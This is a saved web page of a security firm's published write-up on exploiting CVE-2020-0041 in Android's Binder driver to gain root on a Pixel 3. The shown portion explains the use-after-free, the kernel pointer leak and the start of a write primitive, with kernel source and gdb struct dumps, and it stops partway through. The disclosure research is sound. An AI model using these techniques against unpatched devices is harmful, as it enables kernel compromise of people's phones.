<!DOCTYPE html>
<!-- saved from url=(0090)https://labs.bluefrostsecurity.de/blog/2020/04/08/cve-2020-0041-part-2-escalating-to-root/ -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<script async="" src="./2020 - Exploiting CVE-2020-0041 - Part 2 Escalating to root_files/gtm.js.下載"></script><script defer="" type="application/javascript">window.consentFriendConfig = {"version":"1","elementID":"consentfriend","noAutoLoad":false,"htmlTexts":false,"embedded":false,"groupByPurpose":true,"storageMethod":"cookie","cookieName":"consentfriend","cookieExpiresAfterDays":365,"default":false,"mustConsent":true,"acceptAll":true,"hideDeclineAll":false,"hideLearnMore":false,"noticeAsModal":true,"poweredBy":"https://modmore.com/consentfriend","disablePoweredBy":true,"additionalClass":"consentfriend","lang":"en","translations":{"zz":{"privacyPolicyUrl":"https://www.bluefrostsecurity.de/datenschutzerklaerung.html"},"en":{"privacyPolicy":{"name":"privacy policy","text":"For further details, please refer to our {privacyPolicy}."},"consentModal":{"title":"Services we would like to use","description":"This website uses services to provide you with an optimal website experience. This includes services that are necessary for the operation of the site and its security, as well as those used for other purposes. You can decide for yourself which services you want to allow. For further details, please see our privacy policy."},"consentNotice":{"testing":"Testing mode!","changeDescription":"There have been changes since your last visit, please renew your consent.","description":"May we activate additional services for {purposes}?","learnMore":"View details"},"purposes":{"functional":{"title":"Required","description":"These services are necessary for the correct functioning of this website. They cannot be deactivated."},"performance":{"title":"Performance","description":"These services process personal information in order to optimize the service offered by this website."},"marketing":{"title":"Features","description":"These services from external resources process personal information to show you relevant content."},"advertising":{"title":"Advertising","description":"These services process personal information to show you personalized or interest-based advertisements."},"security":{"title":"Security","description":"These services process personal information to protect the content, the hosting or the forms of the website."},"styling":{"title":"Styling","description":"These services process personal information to improve the styling of the website."}},"purposeItem":{"service":"Service","services":"Services"},"service":{"disableAll":{"title":"Enable or disable all services","description":"Use this switch to enable or disable all services."},"optOut":{"title":"(opt-out)","description":"This service is loaded by default (but you can opt out)"},"required":{"title":"(always required)","description":"This service is always required"},"purposes":"Purposes","purpose":"Purpose"},"contextualConsent":{"description":"Do you want to load external content supplied by {title}?","acceptOnce":"Yes","acceptAlways":"Always"},"ok":"That's ok","save":"Save","decline":"Decline","close":"Close","acceptAll":"Accept all","acceptSelected":"Accept selected","poweredBy":"Realized with ConsentFriend (Powered by Klaro!)"}},"services":[{"name":"consentFriend","title":"Consent Management","description":"Preserves the consent management settings of the visitor for this website.","purposes":["functional"],"cookies":["consentfriend"],"required":true},{"name":"session","title":"Session Cookie","description":"Preserves the session state of the visitor across page requests.","purposes":["functional"],"cookies":["PHPSESSID"],"required":true},{"name":"googleTagManager","title":"Google Tag Manager","description":"Controls the collection of statistical data in services dependent on this service.","purposes":["performance"],"onInit":function (opts) {
    // initialization code here (will be executed only once per page-load)
    window.dataLayer = window.dataLayer || [];
    window.gtag = function () {
        dataLayer.push(arguments);
    }
    gtag('consent', 'default', {'ad_storage': 'denied', 'analytics_storage': 'denied'});
    gtag('set', 'ads_data_redaction', true);
}
,"onAccept":function (opts) {
    // we notify the tag manager about all services that were accepted. You can define
    // a custom event in GTM to load the service if consent was given.
    for (let k of Object.keys(opts.consents)) {
        if (opts.consents[k]) {
            let eventName = 'consentfriend-' + k + '-accepted';
            dataLayer.push({'event': eventName});
        }
    }
    // if consent for Google Analytics was granted we enable analytics storage
    if (opts.consents['googleAnalytics']) {
        console.log('Google analytics usage was granted!');
        gtag('consent', 'update', {'analytics_storage': 'granted'});
    }
    // if consent for Google Ads was granted we enable ad storage
    if (opts.consents['googleAdSense']) {
        console.log('Google ads usage was granted!');
        gtag('consent', 'update', {'ad_storage': 'granted'});
    }
}
,"onDecline":function (opts) {
    // we notify the tag manager about all services that were declined. You can define
    // a custom event in GTM to unload the service if consent was denied.
    window.dataLayer = window.dataLayer || [];
    window.gtag = function () {
        dataLayer.push(arguments)
    }
    gtag('consent', 'default', {'ad_storage': 'denied', 'analytics_storage': 'denied'})
    gtag('set', 'ads_data_redaction', true)
}
},{"name":"googleMaps","title":"Google Maps","description":"Display maps on the website.","purposes":["marketing"],"contextualConsentOnly":true}]};</script>
<script defer="" data-klaro-config="consentFriendConfig" type="application/javascript" src="./2020 - Exploiting CVE-2020-0041 - Part 2 Escalating to root_files/consentfriend-no-css.js.下載"></script>
  
  <!--<base href="https://labs.bluefrostsecurity.de/">--><base href=".">
  <title>Exploiting CVE-2020-0041 - Part 2: Escalating to root | Bluefrostsecurity</title>
  
  <meta name="keywords" content="Penetration Test, Social Engineering, IT-Infrastruktur, Web-Applikationen, Applikationssicherheit, Source Code Review, Reverse Engineering, Malware Analyse, Social Engineering Awareness Training, Hacking Humans, PHP-Security, IT-Sicherheit-Datensicherheit-Sicherheitsüberprüfung-Sicherheitsanalyse-Sicheheitscheck-
Applikationssicherheit">
  <meta name="author" content="Blue Frost Security GmbH">

  <meta name="viewport" content="width=device-width, initial-scale=1">

  <link rel="stylesheet" href="./2020 - Exploiting CVE-2020-0041 - Part 2 Escalating to root_files/normalize.css">
  <link rel="stylesheet" href="./2020 - Exploiting CVE-2020-0041 - Part 2 Escalating to root_files/skeleton.css">
  <link rel="stylesheet" href="./2020 - Exploiting CVE-2020-0041 - Part 2 Escalating to root_files/custom.css">
    
  <link rel="stylesheet" href="./2020 - Exploiting CVE-2020-0041 - Part 2 Escalating to root_files/atom-one-dark.min.css">
  <script src="./2020 - Exploiting CVE-2020-0041 - Part 2 Escalating to root_files/highlight.min.js.下載"></script>
  <script src="./2020 - Exploiting CVE-2020-0041 - Part 2 Escalating to root_files/cpp.min.js.下載"></script>
  <script>
    document.addEventListener('DOMContentLoaded', (event) => {
     document.querySelectorAll('pre[class~="brush:"]').forEach((el) => {
       hljs.highlightElement(el);
      });
    });
  </script>

  <link rel="icon" type="image/png" href="https://labs.bluefrostsecurity.de/img/favicon.png?v=1">

    
<script type="application/javascript" data-type="application/javascript" data-name="googleTagManager">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','UA-42803705-3');</script>

<link rel="stylesheet" href="./2020 - Exploiting CVE-2020-0041 - Part 2 Escalating to root_files/consentfriend.labs.css">

</head>
<body>
    <div id="outer">
	
        		<header class="header">
            <div id="logo_bar">
                <div class="container">
					<a href="https://labs.bluefrostsecurity.de/">
                    	<img id="logo_lab" src="./2020 - Exploiting CVE-2020-0041 - Part 2 Escalating to root_files/logo_bfs-lab.png" alt="BFS Lab Logo">
					</a>
                    <a href="https://www.bluefrostsecurity.de/" target="_blank">
						<img id="logo_bfs" src="./2020 - Exploiting CVE-2020-0041 - Part 2 Escalating to root_files/logo_bluefrostsecurity.png" alt="Blue Frost Security Logo">
					</a>
                </div>
            </div>
            <div id="nav_bar">
                <div class="container">
                    <div class="row">
                        <div class="twelve columns">
                            <nav>
								<ul>		<li class="first"><a href="https://labs.bluefrostsecurity.de/advisories.html" title="Advisories"><span class="icon icon-adv"></span>Advisories</a></li>
		<li><a href="https://labs.bluefrostsecurity.de/publications.html" title="Publications"><span class="icon icon-pub"></span>Publications</a></li>
		<li class="last active"><a href="https://labs.bluefrostsecurity.de/blog.html" title="Blog"><span class="icon icon-blog"></span>Blog</a></li>
</ul>
                            </nav>
							<button id="btnMode" title="Toggle dark/light mode" onclick="toggleMode();return false;"><div></div></button>
                        </div>
                    </div>
                </div>
            </div>
        </header>

        <div class="fspacer"></div>

        <main>
            <article>
                <section>
                    <div class="container">
                        <div class="row">
                            <div class="twelve columns">
                                <header><h1 class="title"><a href="https://labs.bluefrostsecurity.de/blog/2020/04/08/cve-2020-0041-part-2-escalating-to-root/">Exploiting CVE-2020-0041 - Part 2: Escalating to root</a></h1></header>
								<p class="introtext">Exploiting the kernel with CVE-2020-0041 to achieve root privileges</p>
								<p class="post-info">
									<span class="left">Posted on Apr 08, 2020</span>
							
							
	
								</p>

                            </div>
                        </div>
                        <div class="spacer2"></div>
                    </div>
                </section>
                <div class="container content">
                    <div class="row">
                        <div class="twelve columns">

							<div class="entry">
								<p>A few months ago we discovered and exploited a bug in the Binder driver, which we reported to Google on December 10, 2019. The bug was included in the <a href="https://source.android.com/security/bulletin/2020-03-01#kernel-components">March 2020 Android Security Bulletin</a>, with CVE-2020-0041.</p>
<p>In the <a href="https://labs.bluefrostsecurity.de/blog/2020/03/31/cve-2020-0041-part-1-sandbox-escape/">previous post</a> we described the bug and how to use it to escape the Google Chrome sandbox. If you haven't read that post, please do so now in order to understand what bug we are exploiting and what primitives we have available. In this post we'll describe how to attack the kernel and obtain root privileges on a Pixel 3 device using <strong>the same bug</strong>.</p>
<h2>Reminder: memory corruption primitives</h2>
<p>As described in our <a href="https://labs.bluefrostsecurity.de/blog/2020/03/31/cve-2020-0041-part-1-sandbox-escape/">previous post</a>, we can corrupt parts of a validated binder transaction while it's being processed by the driver. There are two stages at which these values are used that we could target for our attack:</p>
<ol>
<li>When the transaction is received, it gets processed by the userspace components. This includes <em>libbinder</em> (or <em>libhwbinder</em> if using /dev/hwbinder) as well as upper layers. This is what we used to attack the Chrome browser process in the <a href="https://labs.bluefrostsecurity.de/blog/2020/03/31/cve-2020-0041-part-1-sandbox-escape/">previous post</a>.</li>
<li>When userspace is done with the transaction buffer, it asks the driver to free it with the <em>BC_FREE_BUFFER</em> command. This results in the driver processing the transaction buffer.</li>
</ol>
<p>Let's analyze the <a href="https://android.googlesource.com/kernel/msm/+/refs/tags/android-10.0.0_r0.42/drivers/android/binder.c#2416">transaction buffer cleanup code</a> in the binder driver while considering that we could have corrupted the transaction data:</p>
<pre class="brush: cpp; toolbar: false; hljs language-cpp"> 

<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">binder_transaction_buffer_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> binder_proc *proc,
                          <span class="hljs-keyword">struct</span> binder_buffer *buffer,
                          <span class="hljs-type">binder_size_t</span> failed_at,
                          <span class="hljs-type">bool</span> is_failure)</span>
</span>{
    <span class="hljs-type">int</span> debug_id = buffer-&gt;debug_id;
    <span class="hljs-type">binder_size_t</span> off_start_offset, buffer_offset, off_end_offset;

    <span class="hljs-built_in">binder_debug</span>(BINDER_DEBUG_TRANSACTION,
             <span class="hljs-string">"%d buffer release %d, size %zd-%zd, failed at %llx\n"</span>,
             proc-&gt;pid, buffer-&gt;debug_id,
             buffer-&gt;data_size, buffer-&gt;offsets_size,
             (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>)failed_at);

    <span class="hljs-keyword">if</span> (buffer-&gt;target_node)
[<span class="hljs-number">1</span>]     <span class="hljs-built_in">binder_dec_node</span>(buffer-&gt;target_node, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);

    off_start_offset = <span class="hljs-built_in">ALIGN</span>(buffer-&gt;data_size, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">void</span> *));
    off_end_offset = is_failure ? failed_at :
                off_start_offset + buffer-&gt;offsets_size;
[<span class="hljs-number">2</span>]    <span class="hljs-keyword">for</span> (buffer_offset = off_start_offset; buffer_offset &lt; off_end_offset;
         buffer_offset += <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">binder_size_t</span>)) {
        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">binder_object_header</span> *hdr;
        <span class="hljs-type">size_t</span> object_size;
        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">binder_object</span> object;
        <span class="hljs-type">binder_size_t</span> object_offset;

        <span class="hljs-built_in">binder_alloc_copy_from_buffer</span>(&amp;proc-&gt;alloc, &amp;object_offset,
                          buffer, buffer_offset,
                          <span class="hljs-built_in">sizeof</span>(object_offset));
        object_size = <span class="hljs-built_in">binder_get_object</span>(proc, buffer,
                        object_offset, &amp;object);
        <span class="hljs-keyword">if</span> (object_size == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">pr_err</span>(<span class="hljs-string">"transaction release %d bad object at offset %lld, size %zd\n"</span>,
                   debug_id, (u64)object_offset, buffer-&gt;data_size);
            <span class="hljs-keyword">continue</span>;
        }
        hdr = &amp;object.hdr;
        <span class="hljs-keyword">switch</span> (hdr-&gt;type) {
        <span class="hljs-keyword">case</span> BINDER_TYPE_BINDER:
        <span class="hljs-keyword">case</span> BINDER_TYPE_WEAK_BINDER: {
            <span class="hljs-keyword">struct</span> <span class="hljs-title class_">flat_binder_object</span> *fp;
            <span class="hljs-keyword">struct</span> <span class="hljs-title class_">binder_node</span> *node;

            fp = <span class="hljs-built_in">to_flat_binder_object</span>(hdr);
[<span class="hljs-number">3</span>]         node = <span class="hljs-built_in">binder_get_node</span>(proc, fp-&gt;binder);
            <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">NULL</span>) {
                <span class="hljs-built_in">pr_err</span>(<span class="hljs-string">"transaction release %d bad node %016llx\n"</span>,
                       debug_id, (u64)fp-&gt;binder);
                <span class="hljs-keyword">break</span>;
            }
            <span class="hljs-built_in">binder_debug</span>(BINDER_DEBUG_TRANSACTION,
                     <span class="hljs-string">"        node %d u%016llx\n"</span>,
                     node-&gt;debug_id, (u64)node-&gt;ptr);
[<span class="hljs-number">4</span>]         <span class="hljs-built_in">binder_dec_node</span>(node, hdr-&gt;type == BINDER_TYPE_BINDER,
                    <span class="hljs-number">0</span>);
            <span class="hljs-built_in">binder_put_node</span>(node);
        } <span class="hljs-keyword">break</span>;

...

        <span class="hljs-keyword">case</span> BINDER_TYPE_FDA: {
...
            <span class="hljs-comment">/*
             * the source data for binder_buffer_object is visible
             * to user-space and the @buffer element is the user
             * pointer to the buffer_object containing the fd_array.
             * Convert the address to an offset relative to
             * the base of the transaction buffer.
             */</span>
[<span class="hljs-number">5</span>]         fda_offset =
                (parent-&gt;buffer - (<span class="hljs-type">uintptr_t</span>)buffer-&gt;user_data) +
                fda-&gt;parent_offset;
            <span class="hljs-keyword">for</span> (fd_index = <span class="hljs-number">0</span>; fd_index &lt; fda-&gt;num_fds;
                 fd_index++) {
                u32 fd;
                <span class="hljs-type">binder_size_t</span> offset = fda_offset +
                    fd_index * <span class="hljs-built_in">sizeof</span>(fd);

                <span class="hljs-built_in">binder_alloc_copy_from_buffer</span>(&amp;proc-&gt;alloc,
                                  &amp;fd,
                                  buffer,
                                  offset,
                                  <span class="hljs-built_in">sizeof</span>(fd));
[<span class="hljs-number">6</span>]             <span class="hljs-built_in">task_close_fd</span>(proc, fd);
            }
        } <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">default</span>:
            <span class="hljs-built_in">pr_err</span>(<span class="hljs-string">"transaction release %d bad object type %x\n"</span>,
                debug_id, hdr-&gt;type);
            <span class="hljs-keyword">break</span>;
        }
    }
}

</pre>
<p>At <em>[1]</em> the driver checks if there is a target binder node for the current transaction, and if it exists it decrements its reference count. This is interesting because it could trigger the release of such a node if its reference count reaches zero, but we do not have control of this pointer.</p>
<p>At <em>[2]</em> the driver iterates through all objects in the transaction, and goes into a switch statement where the required cleanup is performed for each object type. For types <em>BINDER_TYPE_BINDER</em> and <em>BINDER_TYPE_WEAK_BINDER</em>, the cleanup involves looking up an object using <em>fp-&gt;binder</em> at <em>[3]</em> and then decrementing the reference count at <em>[4]</em>. Since <em>fp-&gt;binder</em> is read from the transaction buffer, we can actually prematurely release node references by replacing this value with a different one. This can in turn lead to use-after-free of <em>binder_node</em> objects.</p>
<p>Finally, for <em>BINDER_TYPE_FDA</em> objects we could corrupt the <em>parent-&gt;buffer</em> field used at [5] and end up closing arbitrary file descriptors on a remote process.</p>
<p>In our exploit we targeted the reference counts of <em>BINDER_TYPE_BINDER</em> objects to cause a use-after-free on objects of type <em>struct binder_node</em>. This is exactly the same type of use-after-free we described in our OffensiveCon <a href="https://labs.bluefrostsecurity.de/files/OffensiveCon2020_bug_collision_tale.pdf">presentation</a> about CVE-2019-2205. However some of the techniques we used in that exploit are not available to us in recent kernels anymore.</p>
<h2>Aside: using binder to talk to yourself</h2>
<p>The binder driver is designed in such a way that transactions can only be sent to handles you have received from other processes or to the <em>context manager</em> (handle 0). In general, when one wants to talk to a service, they first request a handle to the&nbsp;<em>context manager&nbsp;</em>(servicemanager, hwservicemanager or vndservicemanager for the three Binder domains used in current versions of Android).</p>
<p>If a service creates a sub-service or an object on behalf of the client, then the service will send a handle such that the client can talk to the new object.</p>
<p>In some situations, it would be beneficial to control both ends of the communication, e.g. to have better timing control for race conditions. In our particular case, we require knowing the address of the receiving-side binder mapping while we are sending the transaction to avoid a crash. Additionally, in order to cause a use-after-free with the corruption primitive we have, the receiving process has to create binder nodes with the <em>fp-&gt;binder</em> field equal to the&nbsp;<em>sg_buf </em>value we are corrupting with (which belongs to the sender address space).&nbsp;</p>
<p>The easiest way to meet all these constraints is to control both the sending and the receiving end of a transaction. In that case, we have access to all the required values and do not need to use an info-leak to retrieve them from a remote process.</p>
<p>However, we are not allowed to register services through the&nbsp;<em>context manager</em>&nbsp;from unprivileged applications, so we cannot go the <em>normal route</em>. Instead, we used the&nbsp;<em>ITokenManager</em>&nbsp;service in the <em>/dev/hwbinder</em> domain to setup the communication channel.&nbsp;To our knowledge, this service was first publicly used by Gal Beniamini in <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1404">this Project Zero report</a>:</p>
<pre>Note that in order to pass the binder instance between process A and process B, the "Token <br>Manager" service can be used. This service allows callers to insert binder objects and retrieve<br>20-byte opaque tokens representing them. Subsequently, callers can supply the same 20-byte<br>token, and retrieve the previously inserted binder object from the service. The service is <br>accessible even to (non-isolated) app contexts (http://androidxref.com/8.0.0_r4/xref/system/sepolicy/private/app.te#188).
</pre>
<p>We use this very same mechanism in our exploit in order to have a handle to our own "process". Note however that "process" here does not really mean an actual process, but a <em>binder_proc</em> structure associated to a binder file descriptor.</p>
<p>This means we can open two binder file descriptors, create a token through the first file descriptor and retrieve it from the second one. With this, we have received a handle owned by the first file descriptor, and can now send binder transactions between the two.</p>
<h2>Leaking data with the <em>binder_node</em> use-after-free</h2>
<p>Binder nodes are used by the driver in two different ways: as part of transaction contents in order to pass them from one process to another, or as targets of a transaction. When used as part of a transaction, these nodes are always retrieved from a rb-tree of nodes and properly reference counted. When we cause a use-after-free of a node, it also gets removed from the rb-tree. For this reason, we can only have dangling pointers to freed nodes when used as targets of a transaction, since in this case pointers to the actual <em>binder_node</em> are stored by the driver in <em>transaction-&gt;target_node.</em></p>
<p>There are quite a few references to <em>target_node</em> in the binder driver, but many of them are performed in the sending path of a transaction or in debug code. From the others, the <a href="https://android.googlesource.com/kernel/msm/+/refs/tags/android-10.0.0_r0.42/drivers/android/binder.c#4465">transaction receipt path</a> provides us a way to leak some data back to userland:</p>
<pre class="brush: cpp; toolbar: false; hljs language-cpp">        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">binder_transaction_data</span> *trd = &amp;tr.transaction_data;

...

        <span class="hljs-keyword">if</span> (t-&gt;buffer-&gt;target_node) {
            <span class="hljs-keyword">struct</span> <span class="hljs-title class_">binder_node</span> *target_node = t-&gt;buffer-&gt;target_node;
            <span class="hljs-keyword">struct</span> <span class="hljs-title class_">binder_priority</span> node_prio;

[<span class="hljs-number">1</span>]         trd-&gt;target.ptr = target_node-&gt;ptr;
            trd-&gt;cookie =  target_node-&gt;cookie;
            node_prio.sched_policy = target_node-&gt;sched_policy;
            node_prio.prio = target_node-&gt;min_priority;
            <span class="hljs-built_in">binder_transaction_priority</span>(current, t, node_prio,
                            target_node-&gt;inherit_rt);
            cmd = BR_TRANSACTION;
        } <span class="hljs-keyword">else</span> {
            trd-&gt;target.ptr = <span class="hljs-number">0</span>;
            trd-&gt;cookie = <span class="hljs-number">0</span>;
            cmd = BR_REPLY;
        }

...

[<span class="hljs-number">2</span>]     <span class="hljs-keyword">if</span> (<span class="hljs-built_in">copy_to_user</span>(ptr, &amp;tr, trsize)) {
            <span class="hljs-keyword">if</span> (t_from)
                <span class="hljs-built_in">binder_thread_dec_tmpref</span>(t_from);

            <span class="hljs-built_in">binder_cleanup_transaction</span>(t, <span class="hljs-string">"copy_to_user failed"</span>,
                           BR_FAILED_REPLY);

            <span class="hljs-keyword">return</span> -EFAULT;
        }
        ptr += trsize;
</pre>
<p>At <em>[1]</em> the driver extracts two 64-bit values from the <em>target_node</em> into the <em>transaction_data</em> structure. This structure is later copied to userland at <em>[2]</em>. Therefore, if we receive a transaction after we have freed its <em>target_node</em> and replaced it by another object, we can read out two 64-bit fields at the offsets corresponding to <em>ptr</em> and <em>cookie</em>.</p>
<p>If we look at this structure on gdb for a build of a recent pixel 3 kernel, we can see these fields at offsets 0x58 and 0x60 respectively:</p>
<pre>(gdb) pt /o struct binder_node
/* offset    |  size */  type = struct binder_node {
/*    0      |     4 */    int debug_id;
/*    4      |     4 */    spinlock_t lock;
/*    8      |    24 */    struct binder_work {
/*    8      |    16 */        struct list_head {
/*    8      |     8 */            struct list_head *next;
/*   16      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } entry;
/*   24      |     4 */        enum {BINDER_WORK_TRANSACTION = 1, BINDER_WORK_TRANSACTION_COMPLETE, BINDER_WORK_RETURN_ERROR, BINDER_WORK_NODE, BINDER_WORK_DEAD_BINDER, BINDER_WORK_DEAD_BINDER_AND_CLEAR, BINDER_WORK_CLEAR_DEATH_NOTIFICATION} type;

                               /* total size (bytes):   24 */
                           } work;
/*   32      |    24 */    union {
/*                24 */        struct rb_node {
/*   32      |     8 */            unsigned long __rb_parent_color;
/*   40      |     8 */            struct rb_node *rb_right;
/*   48      |     8 */            struct rb_node *rb_left;

                                   /* total size (bytes):   24 */
                               } rb_node;
/*                16 */        struct hlist_node {
/*   32      |     8 */            struct hlist_node *next;
/*   40      |     8 */            struct hlist_node **pprev;

                                   /* total size (bytes):   16 */
                               } dead_node;

                               /* total size (bytes):   24 */
                           };
/*   56      |     8 */    struct binder_proc *proc;
/*   64      |     8 */    struct hlist_head {
/*   64      |     8 */        struct hlist_node *first;

                               /* total size (bytes):    8 */
                           } refs;
/*   72      |     4 */    int internal_strong_refs;
/*   76      |     4 */    int local_weak_refs;
/*   80      |     4 */    int local_strong_refs;
/*   84      |     4 */    int tmp_refs;
<strong>/*   88      |     8 */    binder_uintptr_t ptr;
/*   96      |     8 */    binder_uintptr_t cookie;</strong>
/*  104      |     1 */    struct {
/*  104: 7   |     1 */        u8 has_strong_ref : 1;
/*  104: 6   |     1 */        u8 pending_strong_ref : 1;
/*  104: 5   |     1 */        u8 has_weak_ref : 1;
/*  104: 4   |     1 */        u8 pending_weak_ref : 1;

                               /* total size (bytes):    1 */
                           };
/*  105      |     2 */    struct {
/*  105: 6   |     1 */        u8 sched_policy : 2;
/*  105: 5   |     1 */        u8 inherit_rt : 1;
/*  105: 4   |     1 */        u8 accept_fds : 1;
/*  105: 3   |     1 */        u8 txn_security_ctx : 1;
/* XXX  3-bit hole   */
/*  106      |     1 */        u8 min_priority;

                               /* total size (bytes):    2 */
                           };
/*  107      |     1 */    bool has_async_transaction;
/* XXX  4-byte hole  */
/*  112      |    16 */    struct list_head {
/*  112      |     8 */        struct list_head *next;
/*  120      |     8 */        struct list_head *prev;

                               /* total size (bytes):   16 */
                           } async_todo;

                           /* total size (bytes):  128 */
                         }

    </pre>
<p>Therefore, we need to find objects that we can allocate and free at will, and that contain interesting data at these offsets. When we originally reported this bug to Google we produced a minimal exploit that overwrote <em>selinux_enforcing</em>, and we used a <em>kgsl_drawobj_sync</em> which would leak a pointer to itself and a pointer to a kernel function. This was enough for that minimal proof of concept, but not for a full root exploit as we are describing here.</p>
<p>For the full exploit, we used the same object as in our CVE-2019-2025 exploit: the <em>epitem&nbsp;</em>structure used to track watched files within eventpoll:</p>
<pre>    (gdb) pt /o struct epitem
    /* offset    |  size */  type = struct epitem {
    /*    0      |    24 */    union {
    /*                24 */        struct rb_node {
    /*    0      |     8 */            unsigned long __rb_parent_color;
    /*    8      |     8 */            struct rb_node *rb_right;
    /*   16      |     8 */            struct rb_node *rb_left;

                                       /* total size (bytes):   24 */
                                   } rbn;
    /*                16 */        struct callback_head {
    /*    0      |     8 */            struct callback_head *next;
    /*    8      |     8 */            void (*func)(struct callback_head *);

                                       /* total size (bytes):   16 */
                                   } rcu;

                                   /* total size (bytes):   24 */
                               };
    /*   24      |    16 */    struct list_head {
    /*   24      |     8 */        struct list_head *next;
    /*   32      |     8 */        struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } rdllink;
    /*   40      |     8 */    struct epitem *next;
    /*   48      |    12 */    struct epoll_filefd {
    /*   48      |     8 */        struct file *file;
    /*   56      |     4 */        int fd;

                                   /* total size (bytes):   12 */
                               } ffd;
    /*   60      |     4 */    int nwait;
    /*   64      |    16 */    struct list_head {
    /*   64      |     8 */        struct list_head *next;
    /*   72      |     8 */        struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } pwqlist;
    /*   80      |     8 */    struct eventpoll *ep;
<strong>
    /*   88      |    16 */    struct list_head {
    /*   88      |     8 */        struct list_head *next;
    /*   96      |     8 */        struct list_head *prev;
</strong>    
                                   /* total size (bytes):   16 */
                               } fllink;

    /*  104      |     8 */    struct wakeup_source *ws;
    /*  112      |    16 */    struct epoll_event {
    /*  112      |     4 */        __u32 events;
    /* XXX  4-byte hole  */
    /*  120      |     8 */        __u64 data;

                                   /* total size (bytes):   16 */
                               } event;

                               /* total size (bytes):  128 */
                             }

</pre>
<p>As can be seen above, the <em>fllink</em> linked list overlaps with the leaked fields. This list is used by eventpoll to link all <em>epitem</em> structures that are watching the same <em>struct file</em>. Thus, we can leak a pair of kernel pointers.</p>
<p>There are several possibilities here, but let's consider how the data structures look like if we have only one such <em>epitem</em> structure for a particular <em>struct file</em>:</p>
<p><img class="u-max-full-width" src="./2020 - Exploiting CVE-2020-0041 - Part 2 Escalating to root_files/file_one_epitem.png" alt="" width="939" height="720"></p>
<p>Therefore, should we leak the <em>fllink</em> contents for the <em>epitem</em> in the picture above, we would learn two identical pointers into the file structure. Now consider what happens if we have a second <em>epitem</em> on the same file:</p>
<p><img class="u-max-full-width" src="./2020 - Exploiting CVE-2020-0041 - Part 2 Escalating to root_files/file_two_epitem.png" alt="" width="100%"></p>
<p>In this case, if we leak from both <em>epitem</em> at the same time, we'd be learning their addresses as well as the address of the corresponding <em>struct file</em>.</p>
<p>In our exploit we use both these tricks to disclose a <em>struct file</em> pointer and the address of the freed nodes before using them for the write primitive.</p>
<p>Note however that in order to leak data, we need to leave a pending transaction queued until we can trigger the bug and free the <em>binder_node</em>. The exploit does this by having dedicated threads for each pending transaction, and then decrementing the reference count as many times as required to free the node. After this happens, we can leak from the freed buffer at any time we like, as many times as pending transactions we have created.</p>
<h2>Memory write primitive</h2>
<p>In order to identify a memory write primitive, we turn to another use of the <em>transaction-&gt;target_node</em> field: the decrement of the reference count in <em>binder_transaction_buffer_release</em> discussed earlier. Assume we have replaced the freed node with a fully controlled object. In this case, the driver decrements the reference count of the node with the following code:</p>
<pre class="brush: cpp; toolbar: false; hljs language-cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title">binder_dec_node_nilocked</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> binder_node *node,
                     <span class="hljs-type">int</span> strong, <span class="hljs-type">int</span> internal)</span>
</span>{
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">binder_proc</span> *proc = node-&gt;proc;

    <span class="hljs-built_in">assert_spin_locked</span>(&amp;node-&gt;lock);
    <span class="hljs-keyword">if</span> (proc)
        <span class="hljs-built_in">assert_spin_locked</span>(&amp;proc-&gt;inner_lock);
    <span class="hljs-keyword">if</span> (strong) {
        <span class="hljs-keyword">if</span> (internal)
            node-&gt;internal_strong_refs--;
        <span class="hljs-keyword">else</span>
            node-&gt;local_strong_refs--;
        <span class="hljs-keyword">if</span> (node-&gt;local_strong_refs || node-&gt;internal_strong_refs)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">if</span> (!internal)
            node-&gt;local_weak_refs--;
        <span class="hljs-keyword">if</span> (node-&gt;local_weak_refs || node-&gt;tmp_refs ||
                !<span class="hljs-built_in">hlist_empty</span>(&amp;node-&gt;refs))
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-keyword">if</span> (proc &amp;&amp; (node-&gt;has_strong_ref || node-&gt;has_weak_ref)) {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">list_empty</span>(&amp;node-&gt;work.entry)) {
            <span class="hljs-built_in">binder_enqueue_work_ilocked</span>(&amp;node-&gt;work, &amp;proc-&gt;todo);
            <span class="hljs-built_in">binder_wakeup_proc_ilocked</span>(proc);
        }
[<span class="hljs-number">1</span>] } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">hlist_empty</span>(&amp;node-&gt;refs) &amp;&amp; !node-&gt;local_strong_refs &amp;&amp;
            !node-&gt;local_weak_refs &amp;&amp; !node-&gt;tmp_refs) {
            <span class="hljs-keyword">if</span> (proc) {
                <span class="hljs-built_in">binder_dequeue_work_ilocked</span>(&amp;node-&gt;work);
                <span class="hljs-built_in">rb_erase</span>(&amp;node-&gt;rb_node, &amp;proc-&gt;nodes);
                <span class="hljs-built_in">binder_debug</span>(BINDER_DEBUG_INTERNAL_REFS,
                         <span class="hljs-string">"refless node %d deleted\n"</span>,
                         node-&gt;debug_id);
